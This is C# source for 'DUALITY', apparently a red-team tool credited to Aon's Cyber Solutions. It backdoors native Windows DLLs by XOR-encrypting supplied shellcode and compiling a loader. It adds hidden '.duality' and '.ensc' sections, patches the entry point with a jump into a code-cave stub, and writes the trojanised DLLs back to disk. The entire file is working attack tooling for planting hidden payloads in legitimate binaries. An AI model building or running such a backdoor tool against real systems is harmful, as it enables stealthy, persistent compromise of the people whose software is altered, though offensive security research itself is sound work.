/**
 * Copyright 2024 Aon plc
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
 
using PeNet.Header.Pe;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using static System.Net.Mime.MediaTypeNames;

namespace DUALITY
{
    class Program
    {
        static uint[] preStub =
        {
            0x4c, 0x8b, 0xfc,                               // mov r15, rsp
            0x9c,                                           // pushfq
            0x50,                                           // push rax
            0x53,                                           // push rbx
            0x51,                                           // push rcx
            0x52,                                           // push rdx
            0x56,                                           // push rsi
            0x57,                                           // push rdi
            0x55,                                           // push rbp
            0x41, 0x50,                                     // push r8
            0x41, 0x51,                                     // push r9
            0x41, 0x52,                                     // push r10
            0x41, 0x53,                                     // push r11
            0x41, 0x54,                                     // push r12
            0x41, 0x55,                                     // push r13
            0x41, 0x56,                                     // push r14
            0x48, 0x8d, 0x05, 0x00, 0x00, 0x00, 0x00,       // lea rax, <next_instruction_address>
            0x48, 0x05, 0xd6, 0x7a, 0x0a, 0x00,             // add rax, <some_offset_to_duality_section>
            0xff, 0xd0,                                     // call rax
            0x41, 0x5e,                                     // pop r14
            0x41, 0x5d,                                     // pop r13
            0x41, 0x5c,                                     // pop r12
            0x41, 0x5b,                                     // pop r11
            0x41, 0x5a,                                     // pop r10
            0x41, 0x59,                                     // pop r9
            0x41, 0x58,                                     // pop r8
            0x5d,                                           // pop rbp
            0x5f,                                           // pop rdi
            0x5e,                                           // pop rsi
            0x5a,                                           // pop rdx
            0x59,                                           // pop rcx
            0x5b,                                           // pop rbx
            0x58,                                           // pop rax
            0x9d,                                           // popfq
            0x49, 0x8b, 0xe7,                               // mov rsp, r15
            0x48, 0x89, 0x5c, 0x24, 0x08,                   // mov qword ptr ss:[rsp+8], rbx
            0xe9, 0x93, 0xc5, 0xff, 0xff                    // jmp <back_to_original_dll_code>
        };
        public static uint ReverseBytes(uint value)
        {
            return (value & 0x000000FFU) << 24 | (value & 0x0000FF00U) << 8 |
                (value & 0x00FF0000U) >> 8 | (value & 0xFF000000U) >> 24;
        }

        public static uint RoundUpNearest0x1000(uint value)
        {
            // Windows maps @ memory if divisible by 0x1000, otherwise rounds up
            if (value % 0x1000 == 0)
            {
                return value;
            }
            var rounded = value & 0xFFFFF000;
            return rounded + 0x1000;
        }
        static uint GetStaticAddress(PeNet.PeFile peFile, string sectionName)
        {
            var headers = peFile.ImageSectionHeaders;
            foreach (var header in headers)
            {
                if (header.Name == sectionName)
                {
                    var headerVirtualAddress = header.VirtualAddress;
                    var pointerToRawData = header.PointerToRawData;
                    return peFile.ImageNtHeaders.OptionalHeader.AddressOfEntryPoint - headerVirtualAddress + pointerToRawData;
                }
            }
            return 0;
        }

        static uint GetStaticOffsetToSectionFromFileStart(PeNet.PeFile peFile, string sectionName)
        {
            var headers = peFile.ImageSectionHeaders;
            foreach (var header in headers)
            {
                if (header.Name == sectionName)
                {
                    return header.PointerToRawData;
                }
            }
            return 0;
        }

        static uint GetDynamicOffsetToSectionFromTextSection(PeNet.PeFile peFile, string sectionName)
        {
            var headers = peFile.ImageSectionHeaders;
            List<uint> sizes = new List<uint>();
            foreach (var header in headers)
            {
                if (sectionName == header.Name)
                {
                    return (uint)sizes.Sum(x => Convert.ToUInt32(x));
                }
                sizes.Add(RoundUpNearest0x1000(header.VirtualSize));
            }
            return 0;
        }
        static uint GetSectionSize(PeNet.PeFile peFile, string sectionName)
        {
            var headers = peFile.ImageSectionHeaders;
            foreach (var header in headers)
            {
                if (header.Name == sectionName)
                {
                    return header.SizeOfRawData;
                }
            }
            return 0;
        }

        static uint GetTextSectionStart(PeNet.PeFile PeFile)
        {
            var headers = PeFile.ImageSectionHeaders;
            foreach (var header in headers)
            {
                if (header.Name == ".text")
                {
                    return header.PointerToRawData;
                }
            }
            return 0;
        }

        static uint GetTextSectionEnd(PeNet.PeFile PeFile)
        {
            var headers = PeFile.ImageSectionHeaders;
            foreach (var header in headers)
            {
                if (header.Name == ".text")
                {
                    return header.PointerToRawData + header.SizeOfRawData;
                }
            }
            return 0;
        }

        class ValidRange
        {
            public uint startingAddressStatic = 0;
            // Note to future self, the ending address is the end of the valid RANGE, not the pre-shellcode stub.
            // The range is bigger than the pre-shellcode stub.
            public uint endingAddressStatic = 0;
        }

        static List<ValidRange> FindABunchOfSpace(PeNet.PeFile PeFile)
        {
            var lengthOfPrepStub = preStub.Length;

            List<ValidRange> validRanges = new List<ValidRange>();

            var current00Count = 0;
            var currentCCCount = 0;
            uint startedCCCount = 0;
            uint started00Count = 0;
            uint TextSectionStart = GetTextSectionStart(PeFile);
            uint TextSectionEnd = GetTextSectionEnd(PeFile);

            for (uint x = 0; x < PeFile.FileSize; x++)
            {
                if ((uint)PeFile.RawFile.ReadByte(x) == 0xcc)
                {
                    currentCCCount++;
                    continue;
                }
                else
                {
                    // also check if the address is in executable .text space
                    if (currentCCCount >= lengthOfPrepStub && startedCCCount > TextSectionStart && x <= TextSectionEnd)
                    {
                        Console.WriteLine("\t[*] Found " + currentCCCount + " CCs between 0x" + startedCCCount.ToString("X8") + " and 0x" + x.ToString("X8") + " in .text section space");
                        var vrange = new ValidRange();
                        vrange.startingAddressStatic = startedCCCount;
                        vrange.endingAddressStatic = x;
                        validRanges.Add(vrange);
                    }
                    currentCCCount = 0;
                    startedCCCount = x + 1;
                }

                if ((uint)PeFile.RawFile.ReadByte(x) == 0x00)
                {
                    current00Count++;
                    continue;
                }
                else
                {
                    if (current00Count >= lengthOfPrepStub && started00Count > TextSectionStart && x <= TextSectionEnd)
                    {
                        Console.WriteLine("\t[*] Found " + current00Count + " 00s between 0x" + started00Count.ToString("X8") + " and 0x" + x.ToString("X8") + " in .text section space");
                        var vrange = new ValidRange();
                        vrange.startingAddressStatic = started00Count;
                        vrange.endingAddressStatic = x;
                        validRanges.Add(vrange);
                    }
                    current00Count = 0;
                    started00Count = x + 1;
                }
            }

            return validRanges;
        }

        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] decrypted = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                decrypted[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return decrypted;
        }


        public static string GetUniqueKey(int size)
        {
            char[] chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
            byte[] data = new byte[4 * size];
            using (var crypto = RandomNumberGenerator.Create())
            {
                crypto.GetBytes(data);
            }
            StringBuilder result = new StringBuilder(size);
            for (int i = 0; i < size; i++)
            {
                var rnd = BitConverter.ToUInt32(data, i * 4);
                var idx = rnd % chars.Length;

                result.Append(chars[idx]);
            }
            return result.ToString();
        }

        static void RunCommands(List<string> cmds, string workingDirectory = "")
        {
            var process = new Process();
            var psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.RedirectStandardInput = true;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.WorkingDirectory = workingDirectory;
            process.StartInfo = psi;
            process.Start();
            process.OutputDataReceived += (sender, e) =>
            {
                if (e.Data != null && (e.Data.Contains("error") || e.Data.Contains("ERROR")))
                {
                    ConsoleColor currColor = Console.ForegroundColor;
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\t\t////////////////////////////////////////////////////////////////////////////////");
                    Console.WriteLine("\t\t" + e.Data);
                    Console.WriteLine("\t\t////////////////////////////////////////////////////////////////////////////////");
                    Console.ForegroundColor = currColor;
                }
                else
                {
                    Console.WriteLine("\t\t" + e.Data);
                }
            };
            process.ErrorDataReceived += (sender, e) =>
            {
                if (e.Data != null && (e.Data.Contains("error") || e.Data.Contains("ERROR")))
                {
                    ConsoleColor currColor = Console.ForegroundColor;
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\t\t////////////////////////////////////////////////////////////////////////////////");
                    Console.WriteLine("\t\t" + e.Data);
                    Console.WriteLine("\t\t////////////////////////////////////////////////////////////////////////////////");
                    Console.ForegroundColor = currColor;
                }
                else
                {
                    Console.WriteLine("\t\t" + e.Data);
                }
            };
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
            using (StreamWriter sw = process.StandardInput)
            {
                foreach (var cmd in cmds)
                {
                    sw.WriteLine(cmd);
                }
            }
            process.WaitForExit();
        }

        static byte[] TrimZeros(byte[] pic)
        {
            Array.Reverse(pic);
            var zeroCount = 0;
            for (var x = 0; x < pic.Length; x++)
            {
                if (pic[x] == 0x00)
                {
                    zeroCount++;
                }
                else
                {
                    break;
                }
            }
            pic = pic.Skip(zeroCount - 8).ToArray();
            Array.Reverse(pic);

            return pic;
        }

        static string prepForSCC(string inStr)
        {
            string output = "{ ";
            foreach (char x in inStr)
            {
                if (x.Equals('\\'))
                {
                    output += "'\\\\', ";
                }
                else
                {
                    output += "'" + x + "', ";
                }
            }
            output += "'\\0' };";
            return output;
        }

        static PeNet.PeFile BackdoorDLL(string rawscpath, string originalDLLLocalFilePath, string originalDLLVictimMachineFilePath,
            string backupPrefix, List<string> allOtherDLLsLocalFilePaths, List<string> allOtherBackupPrefixes)
        {
            var envBatPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat";
            var clPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.36.32532\bin\Hostx64\x64\cl.exe";
            var mlPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.36.32532\bin\Hostx64\x64\ml64.exe";
            var masmshcPath = @"C:\Users\Administrator\source\repos\DUALITY_V1_CHECK\DUALITY\DUALITY\masm_shc.exe";
            var sccPath = @"C:\Users\Administrator\source\repos\DUALITY_V1_CHECK\DUALITY\DUALITY\scc.cpp";
            var rawSCPath = rawscpath;
            var peFile = new PeNet.PeFile(originalDLLLocalFilePath);

            ///////////////////////////////////////////////////////////////////
            // 0. Real Quick Op Check If Already Backdoored
            ///////////////////////////////////////////////////////////////////
            if (GetStaticAddress(peFile, ".duality") != 0)
            {
                Console.WriteLine("\t[-] File already backdoored with duality. Spitting it back out.");
                return peFile;
            }

            ///////////////////////////////////////////////////////////////////
            // 1. Load & Encrypt Shellcode
            ///////////////////////////////////////////////////////////////////

            Console.WriteLine("\t[+] Loading and encrypting shellcode");
            byte[] plainsc = File.ReadAllBytes(rawSCPath);
            string key = GetUniqueKey(20);
            string moddedFilePathCpp = Directory.GetParent(sccPath) + "\\" + "sccmod-" + key + ".cpp";
            string moddedFilePathAsm = Directory.GetParent(sccPath) + "\\" + "sccmod-" + key + ".asm";
            string moddedFilePathAsmEn = Directory.GetParent(sccPath) + "\\" + "sccmod-" + key + "_en.asm";
            string moddedFilePathExeEn = Directory.GetParent(sccPath) + "\\" + "sccmod-" + key + "_en.exe";
            byte[] encsc = xor(plainsc, Encoding.ASCII.GetBytes(key));


            /*
            // Write encrypted shellcode out to file just for reference
            using (BinaryWriter binWriter =
                new BinaryWriter(File.Open(@"C:\users\Administrator\desktop\backupsc.bin", FileMode.Create)))
            {
                // Write string
                binWriter.Write(encsc);
            }
            */


            ///////////////////////////////////////////////////////////////////
            // 2. Prep SCC File
            ///////////////////////////////////////////////////////////////////

            Console.WriteLine("\t[+] Preparing SCC file");
            string sccFileText = File.ReadAllText(sccPath);

            string dllPath = originalDLLVictimMachineFilePath;
            string dllName = Path.GetFileName(dllPath);
            string backupName = backupPrefix + dllName;
            string checkMutex = "Local\\\\" + GetUniqueKey(15);

            Console.WriteLine("\t\t[*] Backup name for " + originalDLLVictimMachineFilePath + ": " + backupName);

            sccFileText = sccFileText.Replace("#define KEY \"asdf\"", "#define KEY \"" + key + "\"");
            sccFileText = sccFileText.Replace("#define KEYLEN 69", "#define KEYLEN " + key.Length);
            sccFileText = sccFileText.Replace("#define SCLEN 69", "#define SCLEN " + encsc.Length);
            sccFileText = sccFileText.Replace("#define DLLPATH \"asdf\"", "#define DLLPATH " + prepForSCC(dllPath));
            sccFileText = sccFileText.Replace("#define BACKUPNAME \"asdf\"", "#define BACKUPNAME " + prepForSCC(backupName));
            sccFileText = sccFileText.Replace("#define CHECKMUTEX \"asdf\"", "#define CHECKMUTEX \"" + checkMutex + "\"");

            for (int i = 0; i < allOtherDLLsLocalFilePaths.Count; i++)
            {
                allOtherDLLsLocalFilePaths[i] = allOtherDLLsLocalFilePaths[i].Replace("\\", "\\\\");
            }
            string dualsLine = "const char* duals[] = { \"" + String.Join("\", \"", allOtherDLLsLocalFilePaths.ToArray()) + "\" };";

            string backupPrefixesLine = "const char* backupPrefixes[] = { ";
            for (int i = 0; i < allOtherBackupPrefixes.Count; i++)
            {
                if (i == allOtherBackupPrefixes.Count - 1)
                {
                    backupPrefixesLine += "\"" + allOtherBackupPrefixes[i] + Path.GetFileName(allOtherDLLsLocalFilePaths[i]) + "\" ";
                }
                else
                {
                    backupPrefixesLine += "\"" + allOtherBackupPrefixes[i] + Path.GetFileName(allOtherDLLsLocalFilePaths[i]) + "\", ";
                }
            }
            backupPrefixesLine += "};";

            if (allOtherBackupPrefixes.Count == 0)
            {
                backupPrefixesLine = "const char* backupPrefixes[] = { \"\" };";
            }

            sccFileText = sccFileText.Replace("const char* duals[] = { \"asdf\" };", dualsLine);
            sccFileText = sccFileText.Replace("const char* backupPrefixes[] = { \"asdf\" };", backupPrefixesLine);

            File.WriteAllText(moddedFilePathCpp, sccFileText);

            ///////////////////////////////////////////////////////////////////
            // 3. Compile & Link Shellcode via cl.exe, masm_shc.exe, and ml64
            ///////////////////////////////////////////////////////////////////

            // Example:
            //  cl /c /FA /GS- sccmod-dsbjUrZULGGDGGtaGwhS.cpp && masm_shc.exe sccmod-dsbjUrZULGGDGGtaGwhS.asm sccmod-dsbjUrZULGGDGGtaGwhS_en.asm && ml64 sccmod-dsbjUrZULGGDGGtaGwhS_en.asm /link /entry:AlignRSP

            Console.WriteLine("\t[+] Compiling, masm_shc, and linking shellcode file into executable: " + moddedFilePathExeEn);
            ConsoleColor currColor = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("\n\t///////////////////////////////////////////////////////////////////");
            Console.WriteLine("\t//////////////  BEGIN EXTERNAL PROC EXECUTION  ////////////////////");
            Console.WriteLine("\t///////////////////////////////////////////////////////////////////\n");
            string setEnvCommand = "\"" + envBatPath + "\"";
            string clCommand = "\"" + clPath + "\" /c /FA /GS- \"" + moddedFilePathCpp + "\"";
            string masmCommand = "\"" + masmshcPath + "\" \"" + moddedFilePathAsm + "\" \"" + moddedFilePathAsmEn + "\"";
            string mlCommand = "\"" + mlPath + "\" \"" + moddedFilePathAsmEn + "\" /link /entry:AlignRSP";
            List<string> commands = new List<string>
            {
                setEnvCommand,
                clCommand,
                masmCommand
            };
            RunCommands(commands, Directory.GetParent(sccPath).ToString());

            // Replace all instances of JMP SHORT to a regular jump and remove offset flat:
            Console.WriteLine("\t[+] Replacing all short jmps to regular jmps in assembly, as well as removing OFFSET FLAT\n\n");
            string asmFile = File.ReadAllText(moddedFilePathAsmEn);
            asmFile = asmFile.Replace("SHORT ", "");
            asmFile = asmFile.Replace("OFFSET FLAT:", "");
            File.WriteAllText(moddedFilePathAsmEn, asmFile);

            Console.WriteLine("\t[+] Linking...\n\n");
            List<string> commands2 = new List<string>
            {
                setEnvCommand,
                mlCommand
            };
            RunCommands(commands2, Directory.GetParent(sccPath).ToString());
            Console.WriteLine("\t///////////////////////////////////////////////////////////////////");
            Console.WriteLine("\t//////////////  END EXTERNAL PROC EXECUTION  //////////////////////");
            Console.WriteLine("\t///////////////////////////////////////////////////////////////////\n\n");
            Console.ForegroundColor = currColor;


            ///////////////////////////////////////////////////////////////////
            // 4. Extract code from .text section of generated executable,
            //      which should be PIC
            ///////////////////////////////////////////////////////////////////


            Console.WriteLine("\t[+] Extracting position-independent shellcode from generated EXE");
            PeNet.PeFile scExe = null;
            try
            {
                scExe = new PeNet.PeFile(moddedFilePathExeEn);
            }
            catch (FileNotFoundException)
            {
                Console.WriteLine("\t[-] File (exe) to extract shellcode from not found, exiting.");
                return null;
            }
            var textSectionLocation = GetStaticOffsetToSectionFromFileStart(scExe, ".text");
            var textSectionsize = GetSectionSize(scExe, ".text");
            byte[] pic = new byte[textSectionsize];
            for (var x = textSectionLocation; x < (textSectionsize + textSectionLocation); x++)
            {
                pic[x - textSectionLocation] = scExe.RawFile.ReadByte(x);
            }
            pic = TrimZeros(pic);


            ///////////////////////////////////////////////////////////////////
            // 5. Backdoor a DLL
            ///////////////////////////////////////////////////////////////////

            Console.WriteLine("\t[+] Beginning backdooring of targeted DLL: " + originalDLLLocalFilePath);
            // We need the entry point relative to the static DLL on disk
            var staticEntryPoint = GetStaticAddress(peFile, ".text");
            if (staticEntryPoint == 0)
            {
                Console.WriteLine("\t[-] Text section not present in file, use a native DLL.");
                System.Environment.Exit(0);
            }
            Console.WriteLine("\t[+] Offset from start of DLL file in static form acquired: 0x" + staticEntryPoint.ToString("X8"));


            // First few instructions from DLL entry points are usually in the form of
            //      mov qword ptr ss:[rsp+x], <reg>  , ie a 48:89 instruction that has 5 opcodes.
            // We'll use patch this to a jmp and execute the instruction in the stub later. then return.
            uint[] firstFewInstructions = new uint[5];
            Console.Write("\t\t[*] First 5 bytes from entry point: ");
            for (uint x = 0; x < 5; x++)
            {
                uint b = peFile.RawFile.ReadByte(staticEntryPoint + x);
                firstFewInstructions[x] = b;
                Console.Write(b.ToString("X2") + " ");
            }
            Console.WriteLine();

            if (firstFewInstructions[0] != 0x48 && firstFewInstructions[1] != 0x89)
            {
                Console.WriteLine("\t\t[-] Expected a specific mov instruction at entry point. This DLL probably won't work well to backdoor using current capabilities.");
                Console.WriteLine("\t\t[-] You can comment out this if-statement check in the code but the DLL will most likely crash after running your payload.");
                Console.WriteLine("\t\t[-] Preferably pick a different DLL.");
                Console.WriteLine("\t\t[-] Returning the unbackdoored DLL for now.");
                return peFile;
            }


            Console.WriteLine("\t[+] Looking for places to stick prep stub");
            List<ValidRange> offsetToSomeRoomFromStart = FindABunchOfSpace(peFile);
            if (offsetToSomeRoomFromStart.Count == 0)
            {
                Console.WriteLine("\t[-] No room to place shellcode stub.");
                System.Environment.Exit(0);
            }
            // We'll just stick stub into first available spot in .text section
            ValidRange validRange = offsetToSomeRoomFromStart[0];


            // jmp rel32: E9 + 4 bytes distance, ex: E9 00000001 jumps 1 byte
            // jmp rel8 is EB but we need more jump room
            // Include offset of 5 patched bytes so we land at the first available opcode in code beach.
            uint offsetToPreStubFromEntry = validRange.startingAddressStatic - staticEntryPoint - 5;
            if (offsetToPreStubFromEntry < 0)
            {
                Console.WriteLine("\t[-] Jump distance is negative, something is wrong.");
                System.Environment.Exit(0);
            }
            byte[] jumpBytes = BitConverter.GetBytes(0xe900000000 + ReverseBytes(offsetToPreStubFromEntry));
            Array.Reverse(jumpBytes);


            Console.Write("\t[+] Patching in jmp rel32 instruction into entry point: ");
            for (uint x = 0; x < 5; x++)
            {
                // We don't need the first 3 null bytes of an 8 byte sequence, it's "E9" + a 32 bit addy.
                peFile.RawFile.WriteByte(staticEntryPoint + x, jumpBytes[x + 3]);
                Console.Write(jumpBytes[x + 3].ToString("X2") + " ");
            }
            Console.WriteLine();


            // Add SC control section to DLL
            // Sick post: https[l4rge1nt3st1n3][sl4sh][sla5h]secanablog[doobydot]wordpress[d0t]com/2020/06/09/how-to-add-a-section-to-a-pe-file/
            Console.WriteLine("\t[+] Adding shellcode control section to DLL");
            AddAndWriteSection(peFile, ".duality", pic, (ScnCharacteristicsType)0x60000020);

            // Add actual SC section to DLL
            Console.WriteLine("\t[+] Adding encrypted shellcode section to DLL");
            AddAndWriteSection(peFile, ".ensc", encsc, (ScnCharacteristicsType)0x40000040);


            Console.WriteLine("\t[+] Modifying pre-shellcode stub to include offset to DUALITY section");
            // Change stub to accomodate for missing instructions and whatnot
            // - We need offset to duality section from our pre-shellcode stub's call rax instruction
            //      to use for the add rax instruction.
            uint offsetToDualityFromStubAdd = GetDynamicOffsetToSectionFromTextSection(peFile, ".duality") - 
                validRange.startingAddressStatic + peFile.ImageNtHeaders.OptionalHeader.SizeOfHeaders - 0x20;
            byte[] offsetToDualityFromStubAddBytes = BitConverter.GetBytes(offsetToDualityFromStubAdd);
            for (uint x = 34; x <= 37; x++)
            {
                preStub[x] = offsetToDualityFromStubAddBytes[x - 34];
            }

            Console.WriteLine("\t[+] Modifying pre-shellcode stub to include instructions we yeeted with our original jump patch");
            // - We then need to add the instructions back that we yeeted with our patch of the initial jump
            uint moveBackoffsetFromPreStubEnd = (uint)(preStub.Length - 10);
            for (uint x = moveBackoffsetFromPreStubEnd; x <= moveBackoffsetFromPreStubEnd; x++)
            {
                preStub[x] = firstFewInstructions[x - moveBackoffsetFromPreStubEnd];
            }

            // - We now need the negative E9 jmp back to the instruction right after our initial jump
            uint jumpBackAfterPreStub = (uint)(-1 * (validRange.startingAddressStatic - staticEntryPoint + 70));
            byte[] jumpBackBytes = BitConverter.GetBytes(0xe900000000 + ReverseBytes(jumpBackAfterPreStub));
            Array.Reverse(jumpBackBytes);

            Console.Write("\t[+] Modifying pre-shellcode stub to jmp back to DLL entry: ");
            for (uint x = 0; x < 5; x++)
            {
                // We don't need the first 3 null bytes of an 8 byte sequence, it's "E9" + a 32 bit addy.
                preStub[preStub.Length - 5 + x] = jumpBackBytes[x + 3];
                Console.Write(jumpBackBytes[x + 3].ToString("X2") + " ");
            }
            Console.WriteLine();



            // Write the pre-shellcode stub
            Console.WriteLine("\t[+] Writing pre-shellcode stub into empty space");
            for (uint x = 0; x < preStub.Length; x++)
            {
                peFile.RawFile.WriteByte(validRange.startingAddressStatic + x, (byte)preStub[x]);
            }

            return peFile;
        }

        static void WriteDLLToDisk(PeNet.PeFile peFile, string backdooredDLLPath)
        {
            try
            {
                System.IO.File.WriteAllBytes(backdooredDLLPath, peFile.RawFile.ToArray());
            }
            catch (IOException)
            {
                ConsoleColor currColor = Console.ForegroundColor;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\t[-] Can't write backdoored file. Backdoored file is being used by another process. Kill the process and try again.");
                Console.ForegroundColor = currColor;
            }
        }

        static void AddAndWriteSection(PeNet.PeFile peToAddTo, string sectionName, byte[] bytesToAdd, ScnCharacteristicsType sectionCharacter)
        {
            peToAddTo.AddSection(sectionName, bytesToAdd.Length, sectionCharacter);
            uint dual1SectionAddy = GetStaticOffsetToSectionFromFileStart(peToAddTo, sectionName);
            for (uint x = 0; x < GetSectionSize(peToAddTo, sectionName); x++)
            {
                peToAddTo.RawFile.WriteByte(dual1SectionAddy + x, 0xf7);
            }
            for (uint x = 0; x < bytesToAdd.Length; x++)
            {
                peToAddTo.RawFile.WriteByte(dual1SectionAddy + x, bytesToAdd[x]);
            }
        }

        /* ChatGPT Strikes Again ;) */
        static List<string> BackupPrograms(List<string> programPaths)
        {
            List<string> backedUpPaths = new List<string>();
            foreach (string programPath in programPaths)
            {
                if (File.Exists(programPath))
                {
                    string backupPath = programPath + ".original";
                    if (File.Exists(backupPath))
                    {
                        Console.WriteLine("[*] Backup file already exists: " + backupPath);
                    }
                    else
                    {
                        File.Copy(programPath, backupPath);
                        Console.WriteLine("[+] Backup created: " + backupPath);
                    }
                    backedUpPaths.Add(backupPath);
                }
                else
                {
                    Console.WriteLine("[-] Program file not found: " + programPath);
                }
            }
            return backedUpPaths;
        }

        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.White;
            ////////////////////////
            /// 0. Intro
            ////////////////////////
            Console.WriteLine("\n\n");
            Console.Write(@"
 ______  _     _ _______        _____ _______ __   __
 |     \ |     | |_____| |        |      |      \_/
 |_____/ |_____| |     | |_____ __|__    |       |

 @primal0xF7  operating under  ");
            ConsoleColor currColor = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Aon's Cyber Solutions");
            Console.ForegroundColor = currColor;
            Console.WriteLine("\n\n");

            // There are three things to consider per input / output DLL for operationalization perspective:
            // - the original DLL name
            // - the original DLL victim machine filepath, which is contained in the DLL name
            // - the original DLL local (DUALITY) machine filepath, which is on Admin's desktop
            // - the output DLL name
            // - the output DLL victim machine filepath, which will be contained the DLL name
            // - the output DLL local filepath, which in this case is Admin's desktop

            if (args.Length < 2)
            {
                Console.WriteLine("Usage: program.exe <sc_path> <dll1> <dll2> ...");
                return;
            }

            // "_____" is the mark that the path information is in the filename itself
            // and we're operating from an operationalized perspective
            List<string> originalDLLsVictimMachineFilePaths = new List<string>();
            List<string> preBackupOriginalDLLsLocalFilePaths = new List<string>();
            if (args[1].Contains("_____"))
            {
                for (int i = 1; i < args.Length; i++)
                {
                    preBackupOriginalDLLsLocalFilePaths.Add(args[i]);
                    var output = args[i].Split(new string[] { "_____" }, StringSplitOptions.None);
                    var strOut = output[1].Replace("-__-", ":").Replace("-_-", "\\");
                    originalDLLsVictimMachineFilePaths.Add(strOut);
                }
            }
            else
            {
                Console.WriteLine("Please follow naming format for each DLL in the form of: <20_random_digits_digits>_____C-__--_-users-_-boofar-_-ffmpeg.dll, where the DLL name contains the DLL path on the target machine");
                return;
            }            

            string rawScPath = args[0];

            List<string> originalDLLsLocalFilePaths = BackupPrograms(preBackupOriginalDLLsLocalFilePaths);

            List<string> backupPrefixes = new List<string>();
            for (int i = 0; i < originalDLLsLocalFilePaths.Count; i++)
            {
                backupPrefixes.Add(GetUniqueKey(10) + '-');
            }

            List<PeNet.PeFile> backdooredDLLs = new List<PeNet.PeFile>();

            for (int i = 0; i < originalDLLsLocalFilePaths.Count; i++)
            {
                List<string> allOtherDLLsVictimMachineFilePaths = new List<string>();
                List<string> allOtherBackupPrefixes = new List<string>();

                for (int j = 0; j < originalDLLsLocalFilePaths.Count; j++)
                {
                    if (i != j)
                    {
                        allOtherDLLsVictimMachineFilePaths.Add(originalDLLsVictimMachineFilePaths[j]);
                        allOtherBackupPrefixes.Add(backupPrefixes[j]);
                    }
                }

                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("\n\n[+] Backdooring DLL: " + originalDLLsLocalFilePaths[i]);
                Console.ForegroundColor = ConsoleColor.White;
                backdooredDLLs.Add(BackdoorDLL(rawScPath, originalDLLsLocalFilePaths[i], originalDLLsVictimMachineFilePaths[i], 
                    backupPrefixes[i], allOtherDLLsVictimMachineFilePaths, allOtherBackupPrefixes));

            }
            for (int i = 0; i < backdooredDLLs.Count; i++)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("\n[+] Writing backdoored DLL to disk: " + preBackupOriginalDLLsLocalFilePaths[i]);
                Console.WriteLine("\t[*] Backup prefix: " + backupPrefixes[i]);
                Console.ForegroundColor = ConsoleColor.White;
                WriteDLLToDisk(backdooredDLLs[i], preBackupOriginalDLLsLocalFilePaths[i]);
            }
        }
    }
}
